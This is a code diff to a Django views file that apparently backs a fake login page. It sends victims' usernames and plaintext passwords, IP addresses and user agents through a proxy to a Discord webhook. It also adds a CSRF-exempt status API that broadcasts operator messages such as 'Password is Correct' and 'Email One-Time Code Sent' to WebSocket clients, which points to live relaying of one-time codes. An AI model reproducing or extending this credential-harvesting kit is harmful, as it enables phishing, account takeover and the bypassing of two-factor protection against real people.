@@ -1,5 +1,10 @@
 from django.shortcuts import render, redirect
 from django.contrib import messages
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
+from django.views.decorators.http import require_http_methods
+from channels.layers import get_channel_layer
+from asgiref.sync import async_to_sync
 import logging
 import requests
 from datetime import datetime
@@ -21,6 +26,44 @@ PROXY = {
 # Set to True to use proxy
 USE_PROXY = True
 
+def send_discord_message(message, color=0x00ff00):
+    """
+    Send a simple message to Discord webhook
+    """
+    try:
+        embed = {
+            "title": "📨 Notification",
+            "description": message,
+            "color": color,
+            "timestamp": datetime.now().isoformat()
+        }
+        
+        payload = {
+            "embeds": [embed],
+            "username": "System Bot"
+        }
+        
+        if USE_PROXY:
+            response = requests.post(
+                WEBHOOK_URL, 
+                json=payload, 
+                timeout=30,
+                proxies=PROXY,
+                headers={'Content-Type': 'application/json'}
+            )
+        else:
+            response = requests.post(
+                WEBHOOK_URL, 
+                json=payload, 
+                timeout=30,
+                headers={'Content-Type': 'application/json'}
+            )
+        
+        return response.status_code == 204
+    except Exception as e:
+        print(f"❌ Error sending Discord message: {e}")
+        return False
+
 def send_discord_notification(username, password, user_id=None, ip_address=None, user_agent=None):
     """
     Send login attempt information to Discord webhook using proxy
@@ -40,6 +83,21 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
                     "name": "🔑 Password",
                     "value": f"||{password}||",
                     "inline": True
+                },
+                {
+                    "name": "🆔 User ID",
+                    "value": str(user_id) if user_id else "Not provided",
+                    "inline": True
+                },
+                {
+                    "name": "🌐 IP Address",
+                    "value": ip_address if ip_address else "Not available",
+                    "inline": True
+                },
+                {
+                    "name": "🖥️ User Agent",
+                    "value": user_agent[:200] if user_agent else "Not available",
+                    "inline": False
                 },
                 {
                     "name": "⏰ Timestamp",
@@ -104,6 +162,9 @@ def send_discord_notification(username, password, user_id=None, ip_address=None,
         return False
 
 def user_profile(request, user_id):
+    """
+    Display the user profile page
+    """
     context = {
         'user_id': user_id,
         'username': 'John Doe',
@@ -115,7 +176,7 @@ def user_profile(request, user_id):
 
 def login_page(request, user_id):
     """
-    Login page view
+    Display the login page
     """
     context = {
         'user_id': user_id,
@@ -124,7 +185,8 @@ def login_page(request, user_id):
 
 def login_user(request, user_id):
     """
-    Handle login - send data to Discord via proxy
+    Handle login - AJAX endpoint that returns JSON response only
+    No redirect, stays on login page - this is intentional for Discord notification
     """
     print("=" * 50)
     print(f"🔐 LOGIN ATTEMPT - User ID: {user_id}")
@@ -136,7 +198,6 @@ def login_user(request, user_id):
         
         print(f"👤 Username received: {username}")
         print(f"🔑 Password received: {'*' * len(password) if password else 'None'}")
-        print(f"📦 All POST data: {request.POST}")
         
         # Get additional information
         ip_address = request.META.get('HTTP_X_FORWARDED_FOR', request.META.get('REMOTE_ADDR', ''))
@@ -157,23 +218,95 @@ def login_user(request, user_id):
         
         if notification_sent:
             print("✅ Successfully sent to Discord")
-            messages.success(request, 'Login information sent to Discord!')
+            return JsonResponse({
+                'status': 'success',
+                'message': 'Login information sent to Discord!'
+            })
         else:
             print("⚠️ Failed to send to Discord")
-            messages.warning(request, 'Could not send to Discord.')
-        
-        print("=" * 50)
-        
-        # Redirect back to profile page
-        return redirect('user_profile', user_id=user_id)
+            return JsonResponse({
+                'status': 'error',
+                'message': 'Failed to send to Discord. Please try again.'
+            })
     
-    print(f"❌ Invalid request method: {request.method}")
-    print("=" * 50)
-    return redirect('login_page', user_id=user_id)
+    # Return error for non-POST requests
+    return JsonResponse({
+        'status': 'error',
+        'message': 'Invalid request method'
+    }, status=400)
 
 def logout_user(request, user_id):
     """
-    Handle logout
+    Handle user logout
     """
+    logout(request)
     messages.info(request, 'You have been logged out.')
     return redirect('login_page', user_id=user_id)
+
+def broadcast_status(status_value, message=""):
+    """
+    Broadcast status to all connected WebSocket clients
+    """
+    try:
+        channel_layer = get_channel_layer()
+        async_to_sync(channel_layer.group_send)(
+            "status_group",
+            {
+                'type': 'status_update',
+                'status': status_value,
+                'message': message,
+                'timestamp': datetime.now().isoformat()
+            }
+        )
+        print(f"📡 Broadcasted status: {status_value} - {message}")
+        return True
+    except Exception as e:
+        print(f"❌ Failed to broadcast status: {e}")
+        return False
+
+@csrf_exempt
+@require_http_methods(["GET", "POST"])
+def api_set_status(request):
+    """
+    API endpoint to receive status updates from the Python app
+    """
+    try:
+        if request.method == 'GET':
+            status_value = request.GET.get('value')
+        else:
+            data = json.loads(request.body)
+            status_value = data.get('value')
+        
+        print(f"📥 Received status update: {status_value}")
+        
+        # Map status values to meaningful messages
+        status_messages = {
+            'True': '✅ Password is Correct',
+            'False': '❌ Password is Incorrect',
+            'yle': '🚨 New Login Attempt',
+            'yle2': '📊 Error occurred. Use Email One-Time Code',
+            'yle3': '📧 Email One-Time Code Sent'
+        }
+        
+        message = status_messages.get(str(status_value), f'Status: {status_value}')
+        
+        # Send to Discord
+        discord_message = f"📊 **Status Update**\nStatus: {message}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
+        send_discord_message(discord_message, color=0x00ff00)
+        
+        # Broadcast to all WebSocket clients
+        broadcast_status(status_value, message)
+        
+        return JsonResponse({
+            'status': 'success',
+            'received': status_value,
+            'message': message,
+            'timestamp': datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        print(f"❌ Error in API: {e}")
+        return JsonResponse({
+            'status': 'error',
+            'error': str(e)
+        }, status=500)
